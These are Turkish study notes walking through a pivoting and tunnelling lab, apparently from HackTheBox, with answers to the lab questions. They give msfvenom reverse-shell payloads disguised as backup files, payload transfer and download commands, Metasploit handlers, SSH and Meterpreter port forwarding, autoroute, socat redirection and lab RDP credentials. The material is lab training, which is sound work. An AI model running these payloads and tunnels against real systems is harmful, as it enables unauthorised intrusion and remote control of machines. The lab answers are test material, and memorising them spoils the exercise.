- `proxychains nmap -v -Pn -sT 172.16.5.19`: Proxychains üzerinden, belirli bir hedefte Nmap tam TCP bağlantı taraması yapar.
    
- `proxychains msfconsole`: Proxychains kullanarak Metasploit Framework'ü başlatır.
    
- `msf6 > search rdp_scanner`: Metasploit'te RDP tarama modüllerini arar.
    
- `proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123`: Proxychains kullanarak RDP oturumu başlatır, 172.16.5.19 adresindeki sunucuya bağlanır.

### 1. **Ağ Adresi:**

Ağ adresi, verilen IP adresi ile subnet mask'in bitwise AND işlemine tabi tutulmasıyla bulunur.

- IP adresi: 172.16.5.129
- Subnet mask: 255.255.254.0

Bu subnet mask'ine göre, bu ağ **172.16.4.0** ağında bulunur.

### 2. **CIDR Notasyonu:**

Subnet mask **255.255.254.0**, CIDR (Classless Inter-Domain Routing) notasyonu olarak **/23** ile ifade edilir. Çünkü bu subnet mask'te 23 adet "1" biti bulunur.

### 3. **Ağdaki Host Sayısı:**

- **/23**'lük bir subnet, **2^9 = 512** IP adresi sağlar (32 bit toplam IP alanından 23 bit network kısmı ayrılır, geriye 9 bit host kısmı kalır).
- Ancak bu adreslerden biri ağ adresi, diğeri yayın (broadcast) adresi olduğu için, bu ağda **510 adet kullanılabilir host** bulunur.

### 4. **Nasıl Hesaplanır?**

- **Subnet mask'ı 255.255.254.0** olan bir ağda 23 bit network kısmı, 9 bit ise host kısmı vardır.
- Toplam adres sayısı: 232−23=5122^{32 - 23} = 512232−23=512
- Kullanılabilir IP adresleri: 512 - 2 = **510**

### 5. **Özet:**

- **Ağ adresi:** 172.16.4.0
- **CIDR:** /23
- **Kullanılabilir host sayısı:** 510
- **Broadcast adresi:** 172.16.5.255

Bu ağda toplamda 510 adet kullanılabilir IP adresi mevcuttur.


![Pasted image 20241003201803.png](/img/user/resimler/Pasted%20image%2020241003201803.png)

Ağınızdaki komşu cihazları görmek için Linux'un yerleşik **ip** komutunu kullanabilirsiniz. Bu komut, ARP tablosunda yakalanan cihazları listeler:

Bu komut, makinenizin daha önce iletişim kurduğu cihazların IP adreslerini ve MAC adreslerini listeleyecektir.



Soru 1  : Dışa dönük bir Web Sunucusuna kimlik bilgilerini başarıyla yakaladınız. Hedefe bağlanın ve ağ arayüzlerini listeleyin. Hedef web sunucusunun kaç tane ağ arayüzü var? (Geri döngü arayüzü dahil)

Cevap : 3

1- Öncelikle ssh ile hedef sisteme bağlanıyoruz. 
![Pasted image 20241003220247.png](/img/user/resimler/Pasted%20image%2020241003220247.png)
2- Ardından ifconfig komutunu çalıştırarak arayüzleri buluyoruz.  Toplam 3 adet arayüz var. 
![Pasted image 20241003220313.png](/img/user/resimler/Pasted%20image%2020241003220313.png)

Soru 2 : İç ağa dönmek için bu bölümde öğretilen kavramları uygulayın ve 172.16.5.19 üzerindeki Windows hedefinin kontrolünü ele geçirmek için RDP (kimlik bilgileri: victor:pass@123) kullanın. Masaüstünde bulunan Flag.txt dosyasının içeriğini gönderin.

Cevap : 
1-  **`-D 9050`**: SSH, yerel makinede 9050 numaralı port üzerinden bir **SOCKS proxy** sunucusu oluşturur. Bu port üzerinden geçen tüm trafik, SSH tüneli aracılığıyla uzaktaki sunucuya yönlendirilir. Yani, bu proxy üzerinden gönderilen tüm trafik şifrelenir ve hedef sunucuya gider.
![Pasted image 20241003220534.png](/img/user/resimler/Pasted%20image%2020241003220534.png)

2- Hedef'e ubuntu ile girdikten sonra hostların aktif olduğunu tespit etmek için ;
`proxychains nmap -v -sn 172.16.4.0/23  komutunu` kullanmamız gerekir fakat bu saatlar süreceği için daha altarnatif bir yol var . 
![Pasted image 20241003221227.png](/img/user/resimler/Pasted%20image%2020241003221227.png)
Böylelikle arp tablosuna bakarak bağlantılı hosları kısmen tespit edebiliriz.

3-  sudo kullanmaz isek -sT taraması yanlış çalışır ve portlar filtreli olarak gözükür. 
![Pasted image 20241003220813.png](/img/user/resimler/Pasted%20image%2020241003220813.png)



# Remote/Reverse Port Forwarding with SSH
SSH'ın lokal hostumuzu dinleyebildiği ve remote host üzerindeki bir servisi bizim portumuza yönlendirebildiği lokal port yönlendirmeyi ve bir pivot host üzerinden remote ağa paket gönderebildiğimiz dinamik port yönlendirmeyi bir önceki yazımızda gördük. Ancak bazen, lokal bir servisi uzaktaki porta da yönlendirmek isteyebiliriz. Şimdi Windows host ==Windows A'==ya RDP yapabileceğimiz senaryoyu ele alalım. Aşağıdaki resimde görülebileceği gibi, önceki durumumuzda Ubuntu sunucusu üzerinden Windows host'a pivot yapabiliyorduk.
![Pasted image 20241004131657.png](/img/user/resimler/Pasted%20image%2020241004131657.png)
?   Saldırı hostuna giden yol yok

Peki ya reverse shell elde etmeye çalışırsak ne olur?

Windows host için giden bağlantı yalnızca 172.16.5.0/23 ağıyla sınırlıdır. Bunun nedeni, Windows host'un saldırı host'unun bulunduğu ağ ile doğrudan bir bağlantısının olmamasıdır. Saldırı hostumuzda bir Metasploit dinleyicisi başlatır ve bir reverse shell elde etmeye çalışırsak, Windows sunucusu kendi ağından (172.16.5.0/23) çıkan trafiği 10.129.x.x (Attack Hostumuz ile Aynı Ağ Adresi) ağına ulaşmak için nasıl yönlendireceğini bilmediğinden burada doğrudan bir bağlantı elde edemeyiz.

Bir sızma testi çalışması sırasında sadece remote masaüstü bağlantısının mümkün olmadığı birkaç zaman vardır. Dosyaları yüklemek/indirmek (RDP panosu devre dışı bırakıldığında), Windows hostlarında numaralandırma yapmak için bir Meterpreter oturumu kullanarak istismarları veya düşük seviyeli Windows API'sini kullanmak isteyebilirsiniz; bu, yerleşik Windows “ [execables](https://lolbas-project.github.io/) ” kullanılarak mümkün değildir.

Bu durumlarda, saldırı hostumuz ile Windows sunucusu arasında ortak bir port olan bir pivot host bulmamız gerekecektir. Bizim durumumuzda, pivot hostumuz hem saldırı hostumuza hem de Windows hedefine bağlanabildiği için Ubuntu sunucusu olacaktır. Windows üzerinde bir Meterpreter shell elde etmek için msfvenom kullanarak bir Meterpreter HTTPS payload'u oluşturacağız, ancak payload için reverse connection yapılandırması Ubuntu sunucusunun host IP adresi (172.16.5.129) olacaktır. Tüm reverse paketlerimizi Metasploit dinleyicimizin çalıştığı saldırı hostlarımızın 8000 portuna yönlendirmek için Ubuntu sunucusundaki 8080 portunu kullanacağız.

#### Creating a Windows Payload with msfvenom
```shell-session
$ msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
```

### Multi/handler'ı Konfigüre Etme ve Başlatma
![Pasted image 20241004132525.png](/img/user/resimler/Pasted%20image%2020241004132525.png)

Payload'umuz oluşturulduktan ve dinleyicimiz yapılandırılıp çalıştırıldıktan sonra, Ubuntu sunucusuna SSH kullanarak bağlanmak için gerekli kimlik bilgilerine zaten sahip olduğumuzdan, scp komutunu kullanarak payload'u Ubuntu sunucusuna kopyalayabiliriz.

#### Transferring Payload to Pivot Host
![Pasted image 20241004132710.png](/img/user/resimler/Pasted%20image%2020241004132710.png)
`scp` (Secure Copy Protocol), bir bilgisayar ağında dosya transferi yapmak için kullanılan bir komuttur. SSH (Secure Shell) protokolü üzerinden güvenli bir şekilde dosya kopyalamak için kullanılır.

`:~/`: Dosyanın hedef sunucudaki yerini belirtir. Bu durumda, dosya hedef sunucunun kullanıcısının ana dizinine (`~` işareti) kopyalanacaktır.

Özetle, bu komut `backupscript.exe` adlı dosyayı hedef sunucunun ana dizinine kopyalar.

Payloadu kopyaladıktan sonra, Ubuntu sunucusunda payloadumuzu kopyaladığımız aynı dizinde aşağıdaki komutu kullanarak bir python3 HTTP sunucusu başlatacağız.


#### Starting Python3 Webserver on Pivot Host
![Pasted image 20241004132915.png](/img/user/resimler/Pasted%20image%2020241004132915.png)

### Windows Hedefinden Payload İndirme
Bu backupscript.exe dosyasını Windows host'undan bir web tarayıcısı veya PowerShell cmdlet'i Invoke-WebRequest aracılığıyla indirebiliriz.

```powershell-session
PS C:\Windows\system32> Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

Payload'umuzu Windows host'a indirdikten sonra, bağlantıları Ubuntu sunucusunun 8080 portundan msfconsole'un 8000 portundaki listener servisine yönlendirmek için SSH remote port forwarding kullanacağız. SSH komutumuzu ayrıntılı hale getirmek ve oturum açma shell'ini sormamasını istemek için -vN argümanını kullanacağız. -R komutu Ubuntu sunucusundan hedefIPadresi:8080 portunu dinlemesini ve 8080 portuna gelen tüm bağlantıları saldırı hostumuzun 0.0.0.0:8000 portundaki msfconsole dinleyicimize yönlendirmesini ister.

#### Using SSH -R
```shell-session
M1R4CKCK@htb[/htb]$ ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```

SSH remote port forward'ı oluşturduktan sonra, Windows hedefinden payload'u çalıştırabiliriz. Payload amaçlandığı gibi çalıştırılırsa ve listener'ımıza geri bağlanmaya çalışırsa, pivot host üzerindeki pivot'tan gelen logları görebiliriz.


### Pivottan Loglarını Görüntüleme
```shell-session
ebug1: client_request_forwarded_tcpip: listen 172.16.5.129 port 8080, originator 172.16.5.19 port 61355
debug1: connect_next: host 0.0.0.0 ([0.0.0.0]:8000) in progress, fd=5
debug1: channel 1: new [172.16.5.19]
debug1: confirm forwarded-tcpip
debug1: channel 0: free: 172.16.5.19, nchannels 2
debug1: channel 1: connected to 0.0.0.0 port 8000
debug1: channel 1: free: 172.16.5.19, nchannels 1
debug1: client_input_channel_open: ctype forwarded-tcpip rchan 2 win 2097152 max 32768
debug1: client_request_forwarded_tcpip: listen 172.16.5.129 port 8080, originator 172.16.5.19 port 61356
debug1: connect_next: host 0.0.0.0 ([0.0.0.0]:8000) in progress, fd=4
debug1: channel 0: new [172.16.5.19]
debug1: confirm forwarded-tcpip
debug1: channel 0: connected to 0.0.0.0 port 8000
```
Her şey düzgün bir şekilde ayarlandıysa, Ubuntu sunucusu üzerinden pivotlanmış bir Meterpreter shell alacağız.


### Meterpreter Oturumu Kuruldu
![Pasted image 20241004133730.png](/img/user/resimler/Pasted%20image%2020241004133730.png)

Meterpreter oturumumuz, gelen bağlantımızın lokal bir hosttan (127.0.0.1) geldiğini listelemelidir, çünkü bağlantıyı Ubuntu sunucusuna giden bir bağlantı oluşturan lokal SSH soketi üzerinden alıyoruz. Netstat komutunu vermek bize gelen bağlantının SSH servisinden olduğunu gösterebilir.

Aşağıdaki grafiksel gösterim bu tekniği anlamak için alternatif bir yol sunmaktadır.

![Pasted image 20241004134143.png](/img/user/resimler/Pasted%20image%2020241004134143.png)

### Bölüm Özet : 

```shell-session
msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
```

```shell-session
msf6 > use exploit/multi/handler


msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https

msf6 exploit(multi/handler) > set lhost 0.0.0.0

msf6 exploit(multi/handler) > set lport 8000

msf6 exploit(multi/handler) > run
```

```shell-session
$ scp backupscript.exe ubuntu@<ipAddressofTarget>:~/
```

```shell-session
$ python3 -m http.server 8123
```

```powershell-session
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

```shell-session
ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```


Soru : Ubuntu sunucu Pivot hostuna atanan hangi IP adresi Windows sunucu hedefi ile iletişime izin verir? (Biçim: x.x.x.x)

Cevap : 


1- Msfvenomdan payload oluştururken dikkat etmesi gerekilen nokta 172.x.x.x olan ip adresini yazmalıyız çünkü windows makina bu adreste .
```shell-session
msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
```


1- İlk olarak reverse shell'imizi oluşturduk ve gerekli parametreleri listenerları girdik . 
![Pasted image 20241004135202.png](/img/user/resimler/Pasted%20image%2020241004135202.png)

2- Hedef ubuntu sunucumuza oluşturduğumuz payloadı yolluyoruz.
![Pasted image 20241004135351.png](/img/user/resimler/Pasted%20image%2020241004135351.png)

3- Ardından ubuntu sunucusunda python server oluşturuyoruz ve Windows'a proxychain ile köprü oluşturup . Windows makinaya rdp ile bağlanıyoruz . 

```shell-session
 ssh -D 9050 ubuntu@10.129.202.64
```

```shell-session
$ tail -4 /etc/proxychains.conf

# meanwile
# defaults set to "tor"
socks4 	127.0.0.1 9050
```

```shell-session
msf6 > search rdp_scanner
```

```shell-session
$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

4- Windows makinada payloadımızı indiriyoruz .
```powershell-session
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

5- exe dosyası çalıştırmandan önce 
```shell-session
ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```
InternalIPofPivotHost   --> ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@10.129.228.104 -vN
Yani Ubuntunun 172.x.x.x olan ağı 

6- Son olarak meterpreter shell geldi 
![Pasted image 20241004152442.png](/img/user/resimler/Pasted%20image%2020241004152442.png)



# Meterpreter Tunneling & Port Forwarding
Şimdi, Ubuntu sunucusunda (pivot host) Meterpreter shell erişimimizin olduğu ve pivot host üzerinden numaralandırma taramaları yapmak istediğimiz, ancak Meterpreter oturumlarının bize getirdiği kolaylıklardan yararlanmak istediğimiz bir senaryoyu ele alalım. Bu gibi durumlarda, SSH port yönlendirmesine güvenmeden Meterpreter oturumumuzla bir pivot oluşturabiliriz. Aşağıdaki komutla Ubuntu sunucusu için bir Meterpreter shell oluşturabiliriz, bu da saldırı hostumuzda 8080 portunda bir shell döndürecektir.

#### Creating Payload for Ubuntu Pivot Host
```shell-session
M1R4CKCK@htb[/htb]$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Final size of elf file: 250 bytes
Saved as: backupjob
```
Payload'u kopyalamadan önce, Generic Payload Handler olarak da bilinen bir [multi/handler](https://www.rapid7.com/db/modules/exploit/multi/handler/) başlatabiliriz.

### Multi/handler'ı Yapılandırma ve Başlatma
![Pasted image 20241004155552.png](/img/user/resimler/Pasted%20image%2020241004155552.png)
Backupjob binary dosyasını SSH üzerinden Ubuntu pivot host'a kopyalayabilir ve bir Meterpreter oturumu kazanmak için çalıştırabiliriz.

### Pivot Host'ta Payload'un Çalıştırılması
![Pasted image 20241004155702.png](/img/user/resimler/Pasted%20image%2020241004155702.png)
Payload'u çalıştırdıktan sonra Meterpreter oturumunun başarıyla kurulduğundan emin olmamız gerekir.


### Meterpreter Session Kurulumu
```shell-session
[*] Sending stage (3020772 bytes) to 10.129.202.64
[*] Meterpreter session 1 opened (10.10.14.18:8080 -> 10.129.202.64:39826 ) at 2022-03-03 12:27:43 -0500
meterpreter > pwd

/home/ubuntu
```
Windows hedefinin 172.16.5.0/23 ağında olduğunu biliyoruz. Dolayısıyla, Windows hedefindeki güvenlik duvarının ICMP isteklerine izin verdiğini varsayarsak, bu ağ üzerinde bir ping taraması yapmak isteriz. Bunu, Ubuntu hostundan 172.16.5.0/23 ağına ICMP trafiği oluşturacak olan ==ping_sweep== modülü ile Meterpreter kullanarak yapabiliriz.



#### Ping Sweep
```shell-session
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23

[*] Performing ping sweep for IP range 172.16.5.0/23
```
Ayrıca, belirlediğimiz ağ aralığındaki herhangi bir cihaza ping atacak bir hedef pivot host üzerinde doğrudan bir ==for döngüsü== kullanarak bir ping taraması da gerçekleştirebiliriz. İşte Linux tabanlı ve Windows tabanlı pivot hostlar için kullanabileceğimiz iki yararlı ping tarama for döngüsü tek satırları.

#### Ping Sweep For Loop on Linux Pivot Hosts
```shell-session
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```

#### Ping Sweep For Loop Using CMD
```cmd-session
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

#### Ping Sweep Using PowerShell
```powershell-session
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
```

Not: Bir ping taraması, özellikle ağlar arasında iletişim kurarken, ilk denemede başarılı yanıtlarla sonuçlanmayabilir. Bu, bir hostun arp önbelleğini oluşturması için geçen süreden kaynaklanabilir. Bu durumlarda, arp önbelleğinin oluşturulmasını sağlamak için ping taramamızı en az iki kez denemek iyi olur.

Bir hostun güvenlik duvarının ping'i (ICMP) engellediği ve ping'in bize başarılı yanıtlar vermediği senaryolar olabilir. Bu durumlarda, Nmap ile 172.16.5.0/23 ağı üzerinde bir TCP taraması gerçekleştirebiliriz. Port forwarding için SSH kullanmak yerine, saldırı hostumuzda lokal bir proxy yapılandırmak için Metasploit'in post-exploitation routing modülü socks_proxy'yi de kullanabiliriz. SOCKS proxy'sini SOCKS sürüm 4a için yapılandıracağız. Bu SOCKS yapılandırması 9050 numaralı portta bir listener başlatacak ve Meterpreter oturumumuz üzerinden alınan tüm trafiği yönlendirecektir.


#### Configuring MSF's SOCKS Proxy
```shell-session
msf6 > use auxiliary/server/socks_proxy

msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
SRVPORT => 9050
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
SRVHOST => 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set version 4a
version => 4a
msf6 auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 0.

[*] Starting the SOCKS proxy server
msf6 auxiliary(server/socks_proxy) > options

Module options (auxiliary/server/socks_proxy):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The address to listen on
   SRVPORT  9050             yes       The port to listen on
   VERSION  4a               yes       The SOCKS version to use (Accepted: 4a,
                                        5)


Auxiliary action:

   Name   Description
   ----   -----------
   Proxy  Run a SOCKS proxy server
```


### Proxy Sunucusunun Çalıştığını Doğrulama
```shell-session
msf6 auxiliary(server/socks_proxy) > jobs

Jobs
====

  Id  Name                           Payload  Payload opts
  --  ----                           -------  ------------
  0   Auxiliary: server/socks_proxy
```


SOCKS sunucusunu başlattıktan sonra, Nmap gibi diğer araçlar tarafından oluşturulan trafiği tehlikeye atılmış Ubuntu hostundaki pivotumuz üzerinden yönlendirmek için proxychains'i yapılandıracağız. Aşağıdaki satırı /etc/proxychains.conf adresinde bulunan proxychains.conf dosyamızın sonuna ekleyebiliriz, eğer zaten orada değilse


### Gerekirse proxychains.conf dosyasına bir satır ekleme
```shell-session
socks4 	127.0.0.1 9050
```
Not: SOCKS sunucusunun çalıştığı sürüme bağlı olarak, zaman zaman proxychains.conf dosyasında socks4'ü socks5 olarak değiştirmemiz gerekebilir.

Son olarak, socks_proxy modülümüze tüm trafiği Meterpreter oturumumuz üzerinden yönlendirmesini söylememiz gerekir. Metasploit'in ==post/multi/manage/autoroute== modülünü kullanarak 172.16.5.0 alt ağı için rota ekleyebilir ve ardından tüm proxy zincir trafiğimizi yönlendirebiliriz.

#### Creating Routes with AutoRoute
```shell-session
msf6 > use post/multi/manage/autoroute

msf6 post(multi/manage/autoroute) > set SESSION 1
SESSION => 1
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
SUBNET => 172.16.5.0
msf6 post(multi/manage/autoroute) > run

[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: linux
[*] Running module against 10.129.202.64
[*] Searching for subnets to autoroute.
[+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.16.5.0/255.255.254.0 from host's routing table.
[*] Post module execution completed
```

Meterpreter oturumundan autoroute çalıştırılarak autoroute ile rota eklemek de mümkündür.

```shell-session
meterpreter > run autoroute -s 172.16.5.0/23

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 172.16.5.0/255.255.254.0...
[+] Added route to 172.16.5.0/255.255.254.0 via 10.129.202.64
[*] Use the -p option to list all active routes
```

Gerekli rotaları ekledikten sonra, yapılandırmamızın beklendiği gibi uygulandığından emin olmak için aktif rotaları listelemek için -p seçeneğini kullanabiliriz.


### AutoRoute ile Aktif Rotaları Listeleme
```shell-session
meterpreter > run autoroute -p

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]

Active Routing Table
====================

   Subnet             Netmask            Gateway
   ------             -------            -------
   10.129.0.0         255.255.0.0        Session 1
   172.16.4.0         255.255.254.0      Session 1
   172.16.5.0         255.255.254.0      Session 1
```
Yukarıdaki çıktıdan da görebileceğiniz gibi, rota 172.16.5.0/23 ağına eklenmiştir. Artık Nmap trafiğimizi Meterpreter oturumumuz üzerinden yönlendirmek için proxyychains kullanabileceğiz.


### Proxy ve Yönlendirme İşlevselliğini Test Etme
```shell-session
M1R4CKCK@htb[/htb]$ proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn

ProxyChains-3.1 (http://proxychains.sf.net)
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-03 13:40 EST
Initiating Parallel DNS resolution of 1 host. at 13:40
Completed Parallel DNS resolution of 1 host. at 13:40, 0.12s elapsed
Initiating Connect Scan at 13:40
Scanning 172.16.5.19 [1 port]
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19 :3389-<><>-OK
Discovered open port 3389/tcp on 172.16.5.19
Completed Connect Scan at 13:40, 0.12s elapsed (1 total ports)
Nmap scan report for 172.16.5.19 
Host is up (0.12s latency).

PORT     STATE SERVICE
3389/tcp open  ms-wbt-server

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds
```


## Port Forwarding
Port yönlendirme Meterpreter'ın portfwd modülü kullanılarak da gerçekleştirilebilir. Saldırı hostumuzda bir listener etkinleştirebilir ve Meterpreter'dan bu port üzerinden alınan tüm paketleri Meterpreter oturumumuz üzerinden 172.16.5.0/23 ağındaki bir remote host'a iletmesini isteyebiliriz.

#### Portfwd options
```shell-session
meterpreter > help portfwd

Usage: portfwd [-h] [add | delete | list | flush] [args]


OPTIONS:

    -h        Help banner.
    -i <opt>  Index of the port forward entry to interact with (see the "list" command).
    -l <opt>  Forward: local port to listen on. Reverse: local port to connect to.
    -L <opt>  Forward: local host to listen on (optional). Reverse: local host to connect to.
    -p <opt>  Forward: remote port to connect to. Reverse: remote port to listen on.
    -r <opt>  Forward: remote host to connect to.
    -R        Indicates a reverse port forward.
```

#### Creating Local TCP Relay
```shell-session
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19

[*] Local TCP relay created: :3300 <-> 172.16.5.19:3389
```

Yukarıdaki komut Meterpreter oturumundan saldırı hostumuzun lokal portu (-l) 3300'de bir listener başlatmasını ve tüm paketleri Meterpreter oturumumuz aracılığıyla 3389 portundaki (-p) uzak (-r) Windows sunucusu 172.16.5.19'a iletmesini ister. Şimdi, localhost:3300 üzerinde xfreerdp komutunu çalıştırırsak, bir remote desktop oturumu oluşturabileceğiz.


### Windows Target'a localhost üzerinden bağlanma
```shell-session
M1R4CKCK@htb[/htb]$ xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```

### Netstat Output
Yakın zamanda kurduğumuz oturumla ilgili bilgileri görüntülemek için Netstat'ı kullanabiliriz. Savunma açısından bakıldığında, bir hostun ele geçirildiğinden şüpheleniyorsak Netstat'ı kullanmaktan fayda sağlayabiliriz. Bu, bir hostun kurduğu tüm oturumları görüntülememizi sağlar.

```shell-session
M1R4CKCK@htb[/htb]$ netstat -antp

tcp        0      0 127.0.0.1:54652         127.0.0.1:3300          ESTABLISHED 4075/xfreerdp 
```


## Meterpreter Reverse Port Forwarding
Lokal port yönlendirmelerine benzer şekilde, Metasploit aşağıdaki komutla reverse port yönlendirme de gerçekleştirebilir, burada tehlikeye atılmış sunucuda belirli bir portu dinlemek ve Ubuntu sunucusundan gelen tüm shellleri saldırı hostumuza yönlendirmek isteyebilirsiniz. Windows için saldırı hostumuzda yeni bir portta bir dinleyici başlatacağız ve Ubuntu sunucusundan 1234 numaralı portta Ubuntu sunucusuna gelen tüm istekleri 8081 numaralı porttaki listener'ımıza iletmesini isteyeceğiz.

Aşağıdaki komutu kullanarak önceki senaryodaki mevcut shell'imiz üzerinde bir reverse port forward oluşturabiliriz. Bu komut Ubuntu sunucusu üzerinde çalışan 1234 numaralı porttaki tüm bağlantıları lokal (-l) 8081 numaralı porttaki saldırı hostumuza yönlendirir. Ayrıca listener'ımızı bir Windows shell için 8081 portunu dinleyecek şekilde yapılandıracağız. 


### Reverse Port Yönlendirme Kuralları
```shell-session
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18

[*] Local TCP relay created: 10.10.14.18:8081 <-> :1234
```


### multi/handler'ı Yapılandırma ve Başlatma
```shell-session
meterpreter > bg

[*] Backgrounding session 1...
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LPORT 8081 
LPORT => 8081
msf6 exploit(multi/handler) > set LHOST 0.0.0.0 
LHOST => 0.0.0.0
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 0.0.0.0:8081 
```
Artık Windows hostumuzda çalıştırıldığında 172.16.5.129:1234 adresindeki Ubuntu sunucumuza bir bağlantı gönderecek bir reverse shell payload oluşturabiliriz. Ubuntu sunucumuz bu bağlantıyı aldığında, bunu yapılandırdığımız saldırı hostunun ip:8081'ine iletecektir.


### Windows Payload'unun Oluşturulması
```shell-session
M1R4CKCK@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: backupscript.exe
```
Son olarak, payload'umuzu Windows host üzerinde çalıştırırsak, Ubuntu sunucusu üzerinden pivot edilen Windows'tan bir shell alabilmeliyiz.


### Meterpreter oturumunun oluşturulması
```shell-session
[*] Started reverse TCP handler on 0.0.0.0:8081 
[*] Sending stage (200262 bytes) to 10.10.14.18
[*] Meterpreter session 2 opened (10.10.14.18:8081 -> 10.10.14.18:40173 ) at 2022-03-04 15:26:14 -0500

meterpreter > shell
Process 2336 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\>
```

Soru : Ubuntu pivot hostundan bir ping taraması denendiğinde hangi iki IP adresi bulunabilir? (Format: x.x.x.x,x.x.x.x)
Cevap : 

1- İlk olarak msfvenomda ubuntu makinasında meterpreter oturumu almak için bir payload oluşturuyoruz elf formatında. 
![Pasted image 20241004220739.png](/img/user/resimler/Pasted%20image%2020241004220739.png)

* Payloadı hedef ubuntu sisteme scp ile yolluyoruz.

```shell-session
$ scp backupscript.exe ubuntu@<ipAddressofTarget>:~/
```

* Hedef sisteme yolladıktan sonra yürütülebilir olarak ayarlıyoruz. 

![Pasted image 20241004222138.png](/img/user/resimler/Pasted%20image%2020241004222138.png)

* Msfconsole ayarlarını yapıyoruz . LHOST --> 0.0.0.0   LPORT --> 8080    
* use exploit/multi/handler

Payload'u çalıştırdıktan sonra Meterpreter oturumunun başarıyla kurulduğundan emin olmamız gerekir.

![Pasted image 20241004222526.png](/img/user/resimler/Pasted%20image%2020241004222526.png)

Windows hedefinin 172.16.5.0/23 ağında olduğunu biliyoruz. Dolayısıyla, Windows hedefindeki güvenlik duvarının ICMP isteklerine izin verdiğini varsayarsak, bu ağ üzerinde bir ping taraması yapmak isteriz. Bunu, Ubuntu hostundan 172.16.5.0/23 ağına ICMP trafiği oluşturacak olan ping_sweep modülü ile Meterpreter kullanarak yapabiliriz.

```shell-session
(Meterpreter 1)(/home/ubuntu) > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23

[*] Performing ping sweep for IP range 172.16.5.0/23
[+] 	172.16.5.19 host found
[+] 	172.16.5.129 host found
```

extra
![Pasted image 20241004223935.png](/img/user/resimler/Pasted%20image%2020241004223935.png)

Cevap : 172.16.5.19,172.16.5.129



Soru2: AutoRoute'un eklediği rotalardan hangisi 172.16.5.19'un saldırı hostundan erişilebilir olmasını sağlar? (Format: x.x.x.x/x.x.x.x)

Cevap : 172.16.5.0/255.255.254.0

Sonra Çöz bu odayı sonra 


### Reverse Shell ile Socat Redirection (yönlendirme)
[Socat](https://linux.die.net/man/1/socat), SSH tünelleme kullanmaya gerek kalmadan 2 bağımsız ağ kanalı arasında pipe soketleri oluşturabilen çift yönlü bir aktarım aracıdır. Bir host ve portu dinleyebilen ve bu verileri başka bir IP adresine ve porta iletebilen bir redirector görevi görür. Metasploit'in listener'ını saldırı hostumuzda geçen bölümde bahsettiğimiz komutu kullanarak başlatabilir ve Ubuntu sunucusunda socat'ı başlatabiliriz.

#### Starting Socat Listener
```shell-session
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```
